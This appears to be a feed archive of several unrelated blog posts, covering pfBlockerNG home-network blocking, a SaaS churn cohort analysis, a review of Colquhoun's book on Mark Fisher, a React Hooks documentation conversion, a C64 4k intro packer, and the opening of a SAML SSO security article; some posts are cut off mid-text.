<p>If desired, enable SafeSearch network wide on Google, Yandex, DuckDuckGo, Bing, and PixaBay. You can also set Youtube restrictions and block Firefox DNS over HTTPS.</p>
<figure><img loading="lazy" width="800" height="382" src="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_15.png" alt="pfBlockerNG Safe Search Config" srcset="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_15.png 800w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_15-300x143.png 300w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_15-768x367.png 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption>DNSBL SafeSearch</figcaption></figure>
<h4>DNSBL &amp; IP Feeds</h4>
<p>We recommend you activate additional DNSBL not enabled by the pfBlockerNG Setup Wizard. To do that, you must select ‘Feeds’ and simply select the + next to the ones you would like to add. <strong>DO NOT</strong> select all feeds – we don’t add any IP feeds but instead limit our additions to DNSBL ‘Easylist’, all Ad Blockers, and some of the Malicious options. Don’t worry if some of the lists have duplicates, pfBlockerNG will make sure each entry exists only once. </p>
<figure><img loading="lazy" width="800" height="216" src="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_16.png" alt="pfBlockerNG Feeds" srcset="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_16.png 800w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_16-300x81.png 300w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_16-768x207.png 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption><em>DNSBL &amp; IP Feeds</em></figcaption></figure>
<h4>Feed Grouping and Setup</h4>
<p>pfBlockerNG groups DNSBL together on its own. You will need to access these groups to make sure they are enabled and properly configured. This page also allows you to remove a list whose URL is no longer active or that you no longer want to use. The main things to check are that the ‘State’ is ‘ON’ and the ‘Action’ is ‘Unbound’.</p>
<figure><img loading="lazy" width="800" height="539" src="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_17.png" alt="pfBlockerNG DNSBL Config" srcset="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_17.png 800w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_17-300x202.png 300w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_17-768x517.png 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption>Feed Grouping and Setup</figcaption></figure>
<h2>Adult Content Limitations</h2>
<p>The pfBlockerNG configuration above does a great job at everything we’ve discussed, but falls a bit short when it comes to blocking adult content. There is an option under DNSBL Category ‘Blacklists’ where you can enable Shallalist to block adult sites, but the list is large and not comprehensive. Other similar lists are also resource intensive so we ditched these lists and instead setup our pfSense firewall to use <a rel="noreferrer noopener" href="https://blog.cloudflare.com/introducing-1-1-1-1-for-families/" target="_blank">Cloudflare Family</a>&nbsp;as our DNS provider – a free service that blocks both adult content and malware. This paired with our pfSense firewall running pfBlockerNG gives us everything we need for a safe home network. </p>
<h2>Final Tweaks</h2>
<p>At this point you should have pfBlockerNG configured and running on your network. Now all devices on your network will enjoy blocked ads, improved security, and more privacy while online. Further pfBlockerNG tuning might be needed if you discover a page blocked or want additional blocks – just hop back into pfSense to make your tweaks. </p>
<p>Hope this helped you get pfSense pfBlockerNG setup on your home network. Let us know if we missed something or you have any questions.</p>

<![CDATA[How We Reduced Churn by 87.5%]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>This was posted in 2012 on my personal blog. It unpacks the analysis we did to understand why we were churning customers at my first SaaS business, SocialWOD, and what we did about it.</p>

<p>I was stressing.</p>

<p>We had seen 40% of our customers cancel, and it was eating me up inside.</p>

<p>Each of those (former) customers had:</p>
<ol>
<li>decided they had the problem SocialWOD solves (workout tracking for every gym member at your gym, just by snapping and emailing a photo of your results whiteboard)</li>
<li>decided they needed to solve that problem</li>
<li>done research on solutions that might solve their problem</li>
<li>decided that SocialWOD was compelling enough to try</li>
<li>decided to take out their credit card to pay SocialWOD</li>
<li>used and promoted SocialWOD to their members</li>
</ol>

<p>After investing that much mental and emotional energy, they then they decided to cancel.</p>

<p>Argh.</p>

<p>We were trying to understand what the key differences were between our customers that cancelled, and our customers that didn’t.</p>

<p>We hop on the phone every week or two to call up customers, so qualitative data was no problem.</p>

<p>But we wanted to see what we could learn from our data.</p>
      <h2 id="enter-the-cohort-analysis">
        
        
          Enter the Cohort Analysis <a href="#enter-the-cohort-analysis">#</a>
        
        
      </h2>

<p>A cohort analysis helps you see how behavior varies across different cohorts of customers.</p>

<p>In this case, we were interested in the behavior of the cohort of customers who HAD cancelled, vs the behavior of those that hadn’t. What differences were there in each cohort’s usage of our product, and could we steer more gyms to do things like those gyms that had stayed on as customers?</p>

<p>I had read high-level stuff about cohort analyses, but it was <a href="http://www.skillshare.com/Introduction-to-Marketing-Cohort-Analysis/794424332">this 90 minute cohort analysis class in NY</a> with genius marketer Cassie Lancellotti-Young that really opened my eyes to how to run a proper one.</p>
    
      

<p>Cassie recommended using Excel, and provided a template to use as the basis for a cohort analysis.</p>

<p>She mentioned tools like Kissmetrics and Mixpanel, but they were harder to use, less flexible, and required more overhead than Excel.</p>

<p>Given that likely all of the useful data you’ll want to analyze lives in your application’s database, her suggestion made a ton of sense to me.</p>
    
      <h2 id="how-to-start">
        
        
          How to start <a href="#how-to-start">#</a>
        
        
      </h2>

<p>We started by asking questions.</p>

<p>In this case, we were trying to answer this question:</p>

<p>“What are the major differences between customers that cancel, and customers that don’t?”</p>
    
      <h2 id="pull-some-data">
        
        
          Pull some data <a href="#pull-some-data">#</a>
        
        
      </h2>

<p>The next step was to write a ginormous SQL query pulling out all the data that could possibly help us answer this question.
Here’s some of the relevant data we pulled:</p>

<ul>
<li>The month a customer joined in</li>
<li>The amount a customer paid per month</li>
<li>Free trial length</li>
<li>The number of a gym's members that claimed their SocialWOD profiles</li>
<li># days after paying before canceling their service</li>
<li>whether a gym uses SocialWOD to post their workouts to their gym's Facebook page (where the gym's members hang out)</li>
</ul>

<p>All in all, there were 51 different fields of data that we pulled.</p>
    
      <h2 id="analyze-the-raw-data">
        
        
          Analyze the raw data <a href="#analyze-the-raw-data">#</a>
        
        
      </h2>

<p>I ran pivot tables comparing the difference between gyms that cancelled and gyms that didn’t.</p>

<p>I learned that customers who cancelled:</p>
<ol>
<li>had about half as many of their members claim a SocialWOD profile (so they could engage with our product)</li>
<li>used the "post our workout results to my gym's Facebook page" feature about half as much as gyms who remained customers</li>
<li>paid about 23% more than gyms who stayed</li>
<li>cancelled their subscription after 61 days on average</li>
</ol>

<p><a href="https://www.reemer.com/images/articles/cancellation-cohort-analysis.png"><img title="cancellation-cohort-analysis" src="https://www.reemer.com/images/articles/cancellation-cohort-analysis.png"></a></p>

<p><a href="https://www.reemer.com/images/articles/cancellation-cohort-analysis-2.png"><img title="cancellation-cohort-analysis-2" src="https://www.reemer.com/images/articles/cancellation-cohort-analysis-2.png"></a></p>
    
      <h2 id="square-the-quantitative-with-the-qualitative">
        
        
          Square the quantitative with the qualitative <a href="#square-the-quantitative-with-the-qualitative">#</a>
        
        
      </h2>
<p>We have a spreadsheet that details cancellation reasons for every customer, and I’d estimate we’ve talked to at least half of the customers who quit.
The two most common reasons we kept hearing about why gyms quit were:</p>
<ol>
<li>our athletes aren't using it</li>
<li>it's too expensive. SocialWOD is a nice-to-have (we're working on that ;) ). A member CRM is essentially a must-have for a gym over a certain size. The price for a member CRM is lower that it should be imho, and it sets a strong price anchor in the mind of a customer (i.e. "I *need* a CRM and it costs $X. I don't *need* SocialWOD, but it costs $1.5X.")</li>
</ol>
<p>Given that the quantitative data suggested high member usage and lower price were big drivers of customer retention, the qualitative and quantitative data told a pretty strong story about what to do to cut down on cancellations.</p>

          Acting on the results <a href="#acting-on-the-results">#</a>
        
        
      </h2>

<p>Here’s what we decided to do about each learning:</p>

<p><strong>1. A cancelled customer had about half as many of their members claim a SocialWOD profile (so they could engage with our product).<br></strong><br>Previously, our customers would tell their members to sign up for SocialWOD by posting an announcement about SocialWOD on their gym’s Facebook page, writing on their gym’s blog (read by most members), talking about SocialWOD at the gym, etc.
We figured there’s nothing easier to act on than an email describing benefits and a call-to-action. So we improved our onboarding to help a gym owner export a CSV of their members’ email addresses to send to us.
Once they do, we email each member a description of how SocialWOD benefits them, along with a link to click to sign up.</p>

<p><strong>2. A cancelled customer used the “post our workout results to my gym’s Facebook page” feature about half as much as gyms who remained customers.<br></strong><br>We improved our onboarding so that customers who haven’t set up posting to Facebook receive an email detailing the benefits, providing a video, and a strong CTA to do so.</p>

<p><strong>3. A cancelled customer paid about 23% more than gyms who stayed<br></strong><br>We built some technology than makes processing photos cheaper for larger gyms, and passed those savings on to both our existing and new customers. Those changes enabled us to drop prices by 15-60%, depending on price plan.</p>

<p><strong>4. A customer cancelled their subscription after 61 days on average<br></strong><br>We haven’t acted on this yet, but I can imagine sending gyms that meet some “likely to cancel” criteria an offer around day 45 of their membership to lock in for a year at a heavy discount.</p>
    
      <h2 id="the-outcome">
        
        
          The Outcome <a href="#the-outcome">#</a>
        
        
      </h2>

<p>Since implementing changes 1-3 two months ago, we’ve seen our cancellation rate drop from 40% to 5% - <strong>an 87.5% decrease</strong>. We’re going to run another cohort analysis in a couple months to isolate the impact of each change as it’s still too early to know the long-term impact of these changes, but in the short-term both Ryan and I are stoked about stopping the hemorrhaging.</p>

            <!--kg-card-begin: markdown--><h3 id="onmattcolquhounsegressandmarkfisher">On Matt Colquhoun's <em>Egress</em> and Mark Fisher</h3>
<hr>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p><span>I</span>n January 2017, the leftist English blogger, critic, and cultural theorist Mark Fisher killed himself. Fisher had often connected his struggles with depression with the malaise of life in the shadow of what he referred to as “capitalist realism”: the collective belief that no future is possible beyond the neoliberal dispensation. He had also <a href="https://www.theguardian.com/commentisfree/2012/jul/16/mental-health-political-issue">argued extensively</a> against the current tendency to depoliticize mental illness. Those who have written about Fisher’s death have faced the challenge of taking these arguments seriously, while not reducing his suicide to a political symptom and thereby overwriting what was irreducibly personal about it.</p>
<p>Fisher’s former student Matt Colquhoun takes up this challenge in <em>Egress: On Mourning, Melancholy, and the Fisher-Function</em>, the first book-length study to date of Fisher’s work. Colquhoun’s genre-crossing book explores his experience of his teacher’s suicide and the period of mourning he shared with Fisher’s friends and associates in light of the latter’s ideas about mourning, melancholy, and politics. Like Fisher, Colquhoun accepts the premise that “the personal is political,” but in a particular way. In his 2014 book <em>Ghosts of My Life</em>, Fisher wrote that “[t]he most productive way of reading the ‘personal is political’ is to interpret it as saying: the personal is impersonal. It’s miserable for anyone at all to be themselves . . . Culture, and the analysis of culture, is valuable insofar as it allows an escape from ourselves.” Likewise, Colquhoun explores a range of cultural and theoretical materials in search of modes of “egress”—that is, of “escape from ourselves” and beyond the limited horizons of capitalist realism.</p>
<p>A central instance of the book’s fusion of the personal and political is Colquhoun’s use of the academic literature on “left melancholia” to theorize his and others’ experiences after Fisher’s death. Melancholia became a salient topic among left-wing intellectuals during the early 1990s end-of-history moment, when the “communist horizon” vanished and capitalist realism took hold.</p>
<p>Freud’s “Mourning and Melancholia,” which furnished the vocabulary of these discussions, compares the two states of dejection that the title names in order to define melancholia more precisely. As Fisher glossed Freud: “whereas mourning is the slow, painful withdrawal of libido from the lost object, in melancholia, libido remains attached to what has disappeared.” In the case of left melancholia, the “lost object” is revolution and the communist future.</p>
<p>Based on Freud’s account, some accounts of left melancholia have presented it as a pathological perpetuation of the inevitable phase of mourning that follows political failure. In this version, elaborated by Wendy Brown among others, melancholia is a hindrance to furthering collective projects, and thus something to be overcome. Others, such as Enzo Traverso, have argued that the apparent excessiveness of melancholia contains productive political possibilities. Colquhoun follows Fisher in advocating for the latter position, and makes the case for the revolutionary potential found in the extreme psychological states provoked by loss.</p>
<p>Fisher adapted Jacques Derrida’s neologism “hauntology” to evoke the melancholic presence within 21st-century culture of futures never realized by the 20th century’s utopian projects. He differentiated between the sterile nostalgia of “retro” culture and a distinct “hauntological melancholia” attuned not so much to the specific contents of earlier historical moments as to the conditions of possibility, trajectories, and energies embedded within them. While nostalgic retro culture may fall into the pathological impasses Freud and Brown identified, Fisher argued, hauntological melancholia might conversely sustain a defiance of “the closed horizons of capitalist realism” and inspire “a refusal to adjust to what current conditions call ‘reality.’”</p>
<p>Colquhoun develops this idea, suggesting that mourning transfigured into melancholia can render visible the “impossible Real” hidden by capitalist realism. Central to this claim is Jacques Lacan’s notion of the Real as that which any socially defined “reality” suppresses. For Fisher, “one strategy against capitalist realism could involve invoking the Real(s) underlying the reality that capitalism presents to us.” “Negative Reals” such as mental illness and climate catastrophe, that is, might “allow us to see Kapital’s striplit mall of the mind for what it actually is.”</p>
<p><em>Egress</em> folds these inquiries back onto the narrative of Fisher’s own life and death. In particular, it explores the possibilities found within the collective experience of his mourning among his students, friends and colleagues. As Colquhoun writes, “the surreality of death as it is experienced by those that remain alive injects a strangeness deep into the heart of our communities [and] ruptures the strange behaviours we take for granted.” Drawing upon Georges Bataille and Maurice Blanchot, he considers the ways that “grief and historical failure” can forge “strangely hopeful communities,” and reflects on the potential contained in experiences of rupture. In a different register, Colquhoun builds upon Fisher’s unfinished “Acid Communism” project, which focused on the link between “limit experiences” and collectivist politics.</p>
<p>It is here that both authors’ use of the term “egress” becomes both pivotal and ambiguous. This term is a  variant on “exit,” which originated in the theories of Albert O. Hirschman. In <em>Exit, Voice, and Loyalty</em>, Hirschman identified two predominant responses to the type of crisis that weakens loyalty within any organization (such as a state, party, or business). “Voice,” in the political context at least, refers to any electoral or non-electoral effort to introduce reforms or challenge the power structure. Hence, both the Bernie Sanders campaign and Black Lives Matter protests would fall under this heading. “Exit,” on the other hand, refers in the simplest sense to emigration. It has recently become a favored term in parts of the libertarian right, the idea being that exit generates a market signal that can force change more directly than politics.</p>
<p>The tension in Fisher’s and Colquhoun’s use of “egress” is that in Hirschman’s original version, “exit” is fundamentally apolitical or anti-political, whereas politics is the realm of “voice.” Fisher’s late work, which grounds Colquhoun’s deployment of the term, tries to redefine exit (rebranded as “egress”) in terms closer to Herbert Marcuse’s “Great Refusal”—a “saying no” to the totality of capitalist realism. One pathway for such escapes, for Fisher and Colquhoun as for Marcuse, is aesthetic. Music, literature, and other art forms, they argue, can defamiliarize and de-routinize ordinary experience, allowing us to glimpse the opportunities for escape concealed within it.</p>
<p>Yet how exactly aesthetic experience becomes the basis of a revolutionary collective subjectivity remains somewhat unclear. Fisher’s unfinished “Acid Communism” manuscript returned to the countercultures of the 1960s and ‘70s, where he believed unfinished projects of this sort could be discerned. Fisher’s other way of thinking about egress, conversely, was a future-oriented technological accelerationism, an often misunderstood dimension of his work.</p>
<p>One way to understand Fisher’s account of accelerationism is by way of the previously mentioned trend of retro nostalgia. For Fisher, this trend illustrates the idea, drawn from Deleuze and Guattari, that capitalism is simultaneously transformational and conservative, in that it “engenders and inhibits processes of destratification.” Thus, it leads us through a rapid succession of cultural periods, yet in retro nostalgia the accumulated residue of earlier epochs becomes a source of inertia that closes off new cultural possibilities. The political corollary of this nostalgia is the cross-partisan melancholic longing for the midcentury Fordist dispensation.</p>
<p>Rejecting the retro-nostalgic mode of left melancholia, Fisher instead calls for a “left that can speak. . . in the name of an alien future, that can openly celebrate, rather than mourn, the disintegration of existing socialities and territorialities.” Yet paradoxically, in making this case he returns again to the past, proposing renewed attention to the ruins of past utopian projects not as objects of nostalgia but as sites of buried potentiality. For example, in a discussion of the decrepit monuments of Soviet futurism, he proposes that “we grasp them as relics from a yet-to-be-realised post-capitalist future in which desire and communism are joyfully reconciled.”</p>
<p>Colquhoun’s foregrounding of Fisher’s accelerationism is a worthwhile provocation to the contemporary left’s frequent hostility to technology. But in the end, both he and Fisher seem unable to plausibly link accelerationist exit and collectivist politics. Colquhoun asserts, for instance, that the technological transformations capitalism has brought about in recent years help make revolution imaginable again, because they have “demonstrated the plasticity of our drives.” That is, “if a biological foundation for communicative capitalism can be libidinally engineered in as little as ten years, as Apple’s iPhone has masterfully demonstrated, surely we can re-engineer these drives to establish new foundations for socialism and/or communism in another not-so-distant future.” But who is the “we” in this passage? It can only refer to a future entity, what Colquhoun refers to elsewhere as “a communist subject, or a subject that is the product of collective enunciation.” The statement, then, turns out to be circular: the plural subject who should be the agent of the engineering is actually what needs to be engineered.</p>
<p>Despite the emphasis on “egress,” then, Colquhoun’s and Fisher’s leftist politics cannot do without voice. Right-wing advocates of exit, …</p></div></div>

September 2, 2020 | https://kickstartcoding.online/learn/articles/i-converted-reactjs-org-to-use-hooks/ | <a href="https://web.archive.org/web/*/https://kickstartcoding.online/learn/articles/i-converted-reactjs-org-to-use-hooks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><a target="_blank" href="https://kickstartcoding.online/learn/articles/hooks-or-not-hooks">When we decided to convert our React curriculum to React Hooks</a>, one of the biggest stumbling blocks we ran into was that almost all of the guides, tutorials, and blog posts about React Hooks are written with the assumption that the audience already knows React. Most resources are written from the perspective of ”How to switch from class-style React to hooks-style React”, not “How to learn hooks-style React from scratch”.</p>
<p>Our curriculum has a lot of supplementary reading links in it and it wasn't clear where we would be able to find supplementary reading that taught React Hooks with a beginner rather than a veteran audience in mind.</p>
<p>After some discussion, we came up with a possible solution. <a target="_blank" href="https://reactjs.org/">The ReactJS.org documentation</a> is an excellent resource for all things React, but the beginner guides and tutorial still use class-based React, and the hooks guides have the "aimed at React veterans" problem. This makes sense for these guides in context — a lot of people are still using class-style React, and most of the audience for hooks probably <em>is</em> React veterans — it just doesn't make as much sense for us as a coding school.</p>
<p>But the ReactJS.org site is also completely open source. So we thought: what if we just…updated it ourselves?</p>
<p>We decided to take a stab at doing just that and see how it went. This part of our curriculum update fell to me, so a couple of months ago I cloned the ReactJS.org repo and started experimenting to see how hard it would be to get up and running, adapted, and deployed.</p>
<h2>The Result</h2>
<p>It took a lot of work, and I’ll be talking about all the ins and outs of the update in a future post, because there were a lot of interesting challenges both pedagogically and technically. But for now the result is live at <a target="_blank" href="https://reactwithhooks.netlify.app/">reactwithhooks.netlify.app</a>, and you can take a look at the repo where the changes were made at <a target="_blank" href="https://github.com/kickstartcoding/reactjs.org/tree/convert-all-to-hooks">github.com/kickstartcoding/reactjs.org</a> on <a target="_blank" href="https://github.com/kickstartcoding/reactjs.org/tree/convert-all-to-hooks">the convert-all-to-hooks branch</a>.</p>
<p>The places you’ll find most of the converted examples and explanations are <a target="_blank" href="https://reactwithhooks.netlify.app/tutorial/tutorial.html">the tutorial</a>, <a target="_blank" href="https://reactwithhooks.netlify.app/docs/hello-world.html">the main concepts sections</a>, and <a target="_blank" href="https://reactwithhooks.netlify.app/docs/accessibility.html">the advanced guides sections</a>. For those, we converted the concept explanations, the directions, and all of the examples (including the ones on CodePen so you can see and run working code snippets). Everything from the step-by-step directions for writing a tic-tac-toe game in React to explanations on how to integrate React with older library’s like Backbone.js is now written with hooks in mind.</p>
<p>We hope this will be a useful resource for anyone who either wants to learn React the hooks way from scratch, or who wants to see examples and/or explanations of some of the more complex React concepts implemented in the hooks style.</p>
<h2>Helping Out</h2>
<p>There were a few sections that were particularly tricky to figure out how to convert, or to figure out if conversion was even possible. If you’d like to help us out, take a look at <a target="_blank" href="https://github.com/kickstartcoding/reactjs.org/tree/convert-all-to-hooks#unresolved-issues-with-modifying-the-docs-to-be-100-hooks">the ”unresolved issues” section of the README</a> and let us know if you know how to handle any of the things we couldn’t figure out.</p>
<div><p><img src="https://kickstartcoding.online/media-content/share/1599066782/407/"></p><p>There's still work left to do!</p>
</div><p>Also, of course, please let us know about any issues or bugs you fine to us the converted documentation. We definitely want to make sure it is as useful and error-free as possible.</p>
<h2>Fin.</h2>
<p>All in all, making this adaptation was one of the most fun projects I’ve been able to work on recently. We got a chance to use it as a resource for students during our last cohort, and it seemed to work pretty well. I’m hoping that it will be useful for other people trying to learn React as well, so check it out and let us know what you think!</p>

<h2><a href="https://yupferris.github.io/blog/2020/08/31/c64-4k-intro-packer-deep-dive.html">C64 4k intro packer deep-dive</a></h2>

<p>In <a href="https://yupferris.github.io/blog/2019/02/11/rANS-on-6502">an earlier post</a>, I talked about building an <a href="https://en.wikipedia.org/wiki/Asymmetric_numeral_systems">rABS</a> entropy decoder on <a href="https://en.wikipedia.org/wiki/MOS_Technology_6502">6502</a>, which became the heart of my new 4k intro packer experiment for <a href="https://en.wikipedia.org/wiki/Commodore_64">C64</a>. While exploring several different <a href="https://en.wikipedia.org/wiki/Entropy_encoding">entropy coder</a> variants for simple <a href="https://en.wikipedia.org/wiki/LZ77_and_LZ78">LZ</a> codecs, and in particular tANS or an approximation of it with adaptive probabilities (spoiler alert: this was a dead-end), I realized that rANS was not only a possible alternative, but actually an OK fit for the system, providing a high precision entropy coder with… well, <em>good enough</em> decode speed and a not-as-tricky-as-I-had-originally-feared implementation :) .</p>

<p>However, I intentionally left out several details of the rest of the codec. The earlier post only describes how the entropy decoder is implemented and some of the modeling, the combination of which is kindof the novel thing here. But essentially, it only gives us a way to pull modeled bits out of an encoded bitstream. The bits we actually encode/decode and how we model those is what a codec is <em>really</em> all about; the entropy coding part, while certainly important, is really just a piece of machinery that allows us to build the rest of the codec effectively and take as much advantage of the modeling choices we make as possible.</p>

<p>So, in this post I’d like to go into detail about the rest of the codec, including the LZ scheme chosen, how we model various symbols, how some of these techniques were chosen/tested, and several parts of the encoder. I’ll save the rABS-specific encoding details/intuitions for a future post where I can talk about that specifically in more depth.</p>

<!-- excerpt -->

<p>Before I dig into the current codec details, I want to talk about where the design came from, why I embarked on this journey in the first place, and how things evolved over time.</p>

<p>Back in 2017, for <a href="http://www.pouet.net/prod.php?which=70972">makeshift</a>, my first 4k intro for the C64, I developed a custom LZ compressor to compress all code/data. This compressor was called “<strong>Admiral P4kbar</strong>”, a name which contained both “pack” and “4k” in some form along with a stupid pun; quite the satisfying trifecta. Anyways, when the intro runs, it first relocates the compressed data and decompressor, decompresses the compressed data into memory, and then returns to BASIC to run the decompressed code. This relocation is necessary as we want to pack the intro into a contiguous memory region starting in BASIC memory to make the intro easier to run (just <code>LOAD</code> + <code>RUN</code>, no <code>SYS 1337</code> or whatever nonsense), but the decompressed data also needs to decompress into BASIC memory so we can use BASIC to generate a sine table, which is used in several effects. But I’m digressing a bit already - what I want to talk about specifically is the LZ codec design used there, so we can eventually get to the new packer’s design.</p>

<blockquote>
  <p>Makeshift is <a href="https://github.com/yupferris/makeshift">open-source</a>! You can find the compressor code <a href="https://github.com/yupferris/makeshift/blob/master/admiral-p4kbar/src/main.rs">here</a> and the decompressor code <a href="https://github.com/yupferris/makeshift/blob/master/makeshift.asm">here</a>. The new packer is unfortunately not part of this source release, but will be available when we do our next C64 4k :) .</p>
</blockquote>

<h2 id="apv1-details">apv1 details</h2>

<p>The LZ codec used in Admiral P4kbar (which I’ll now refer to as “<strong>apv1</strong>” for brevity) is relatively straightforward - the data is encoded using a sequence of <em>literals</em> and <em>backreferences</em> (usually called <em>matches</em> in LZ parlance, but I just happened to have called them backreferences in this case because <em>reasons</em>). Literals are coded as a single <code>0</code> control bit followed by a raw 8-bit sequence (no entropy coding here); backferences are coded as a single <code>1</code> control bit followed by a simple entropy-coded <em>length</em> and <em>distance</em> pair. Both of these fields are coded the same way: an index into a 16-entry table is <a href="https://en.wikipedia.org/wiki/Unary_coding">unary-coded</a>, and then the corresponding table entry specifies a 16-bit <em>base</em> value and a number of <em>additional bits</em> (0-15) to read in and add to the base value, which results in the final field value (similar to <a href="https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Markov_chain_algorithm">LZMA’s “distance slots”</a> which are sort of an adjustable <a href="https://en.wikipedia.org/wiki/Elias_gamma_coding">gamma coding</a>-like scheme; this kind of thing is <a href="http://cbloomrants.blogspot.com/2015/02/02-10-15-lz-offset-modeling-rambles.html">really common</a> in LZ codecs). Different tables are used for each field. Lengths always use the same table; distances use one of two tables, one if the length for the current backreference is <code>1</code>, and the other for all other lengths. The tables themselves are coded as 16 4-bit bit counts (packed in nybbles); each entry’s base is the previous entry’s base + 2 to the power of the previous entry’s additional bit count. This packed table representation does introduce some overhead into the coded bitstream (24 bytes always), but is certainly not a bad way to represent/transmit symbol probabilities to the decoder.</p>

<p>Most of the encoding ideas in apv1 came from <a href="https://bitbucket.org/magli143/exomizer/wiki/Home">Exomizer</a>, the de facto standard for data compression for C64 (and other platforms where the decoder environment is limited). Particularly, the distance/length table scheme is totally stolen from there; as is the algorithm to optimally search for the best table bit counts given a set of symbols and their frequencies (which I reimplemented myself as a learning exercise of course, but it’s the same core idea). The exact tables used differ slightly, but this isn’t terribly important. Both compressors also use a similar iterative scheme to find the best parse/encoding pair given the input data: First, an optimal LZ parse given the current best encoding (initially some predetermined “seed” encoding) is found (which is straightforward as there’s no adaptive modeling during coding), and then an optimal encoding is found for the symbols used in that parse. These steps are repeated one after another until no further gains are achieved; usually only a few iterations (2-3) are performed before we find a minima (ideally global but likely local) and we’re done.</p>

<p>Ultimately, apv1 performs worse than Exomizer, and somewhat embarrassingly, has a slightly larger decompressor to boot. In the end I never actually tested Exomizer on the final binary (only a few times early in the development of apv1 for comparison), but I had <a href="https://gist.github.com/yupferris/3d27f8a845c895aed2c0dd6c5493e174">estimated</a> that the intro would have been about 100 bytes smaller had we used Exomizer instead. Not an enormous margin, but definitely would have helped to not have to reduce some of our effects so much, or at least have some nicer/smoother transitions.</p>

<p>That said, I’m not entirely unsatisfied with apv1 - it was developed rather quickly in conjuction with the rest of the intro for <a href="https://www.solskogen.no/">Solskogen</a> that year, and it was a <em>really</em> good exercise for me. Before that I had done some trivial LZ codecs before, but nothing that performed very well or really even did much bit IO, much less entropy coding in any proper capacity. At the same time though, I wasn’t able to experiment with it as much as I would have liked due to the project timeline, and compression suffered a bit as a result. Nevertheless, I decided to use apv1 anyways (because making/using your own custom packer is always rad!) and made the 4k limit just fine (coming in at 4095 bytes after loads of aggressive hand-optimizing, which is normal for 4k’s), but I always knew we could do a little better, and that I would want to take another stab at this eventually. <strong>At the very least, I had to beat Exomizer, at least for this specialized use case.</strong></p>

<p>I didn’t end up touching the project for another year and a half or so, but when developing <a href="http://logicoma.io/squishy/">squishy</a>, I spent some time exploring ways to compress the (somewhat large) decompressor for further size gains. This turned out to be a pretty fruitful endeavor, and not just for that packer - as it turns out, the LZ scheme I implemented (after reading a <a href="http://cbloomrants.blogspot.com/">couple</a> <a href="https://fgiesen.wordpress.com/">great</a> blogs for fun) turned out to be pretty effective on makeshift as well. Granted, the exact same construction wasn’t phenomenal, since the codec was highly tuned to the decompressor it was compressing (as it should be!). But it was promising, very simple (to keep the decompressor as small as possible), and easy to tweak - so naturally I wanted to see if it could be something useful if adjusted for a C64 implementation.</p>

<h2 id="squishys-decompressor-compressor"><a href="http://logicoma.io/squishy/">squishy</a>’s decompressor compressor</h2>

<p>squishy’s decompressor compressor (which I’ll now refer to as “<strong>stage2</strong>”, as it compresses the second decompression stage in that packer) uses a very simple LZ-based coding scheme. As usual, there are two types of <em>packets</em>: <em>literals</em>, which represent single bytes, and <em>matches</em>, which represent copies of data previously seen by the codec. Both types of packets start with an entropy-coded 4-bit <em>length</em> field. A value of 0 for length means the packet is a literal; all other values denote a match, and represent how many bytes the match will copy. Following the length field for literals we have an 8-bit <em>value</em> field (this is the literal’s byte data); for matches we have an 11-bit <em>offset</em> field that determines how far behind the write pointer the copy starts. Matches with length 1 are allowed, and as is common with LZ codecs, a match with length &gt; offset is permitted (assuming a match copy is performed forward byte-by-byte, this is a nice way to “implicitly” support repetitions/<a href="https://en.wikipedia.org/wiki/Run-length_encoding">RLE</a> sequences). A match with an offset of 0 is possible to encode but never used (this wouldn’t make any sense for the decoder, which hasn’t seen the next byte yet), as using an implicit match offset bias doesn’t provide any compression gains in this case and the decoder is a tiny bit smaller without it. There are no repeated offsets.</p>

<p>All of the fields in the stage2 encoding (length, literal value, and match offset) are entropy-coded with the same modeling scheme using a 32-bit arithmetic coder (33 bit in the encoder for carry propagation) that shifts in/out whole bytes at a time. Each type of field gets a separate binary tree of bit predictions, identical to the <a href="https://github.com/jljusten/LZMA-SDK/blob/master/DOC/lzma-specification.txt#L511">“normal scheme” described in the LZMA specification</a>. All predictions are 12 bits and use a very simple fixed-point Howard/Vitter-style update scheme <a href="https://fgiesen.wordpress.com/2015/05/26/models-for-adaptive-arithmetic-coding/">as described by ryg</a>, but using a divide instead of a shift for the update …</p></section></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><p>If you’re here, you’ve likely been tasked with building SAML-based SSO as a requirement for an enterprise deal. If you’re just diving into the problem space of SSO / SAML, we’d first suggest checking out <a href="https://workos.com/blog/the-developers-guide-to-sso">The Developer’s Guide to SSO</a>. Otherwise, buckle up for a brief but titillating foray into why XML-based authentication is... challenging.</p><h2>Why is SAML SSO so vulnerability-prone</h2><p>The attack surface for SAML authentication is extensive, mostly due to the fact that SAML is XML-based. <a href="https://everypageispageone.com/2016/01/28/why-does-xml-suck/">XML is a semantic-free meta-language</a> - it’s hard to form, hard to read, and hard to parse. Combined with the high complexity of the <a href="http://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0.pdf">SAML specification</a> and the number of parties involved in establishing authentication, we get what often feels like a <a href="http://www.laputan.org/mud/mud.html">big ball of mud</a> and all the accompanying implications. Be prepared to tackle a steep learning curve, lots of bugs, high maintenance costs, attack vectors galore, and an absurd spread of edge cases.</p><p>Most SAML SSO security vulnerabilities are introduced by Service Providers (SPs) improperly validating and processing SAML responses received from Identity Providers (IdPs). This happens because SAML SSO is typically not a core-value feature for an application, nor is the implementation common knowledge for most developers. Unknowns become even more unlikely to be identified and 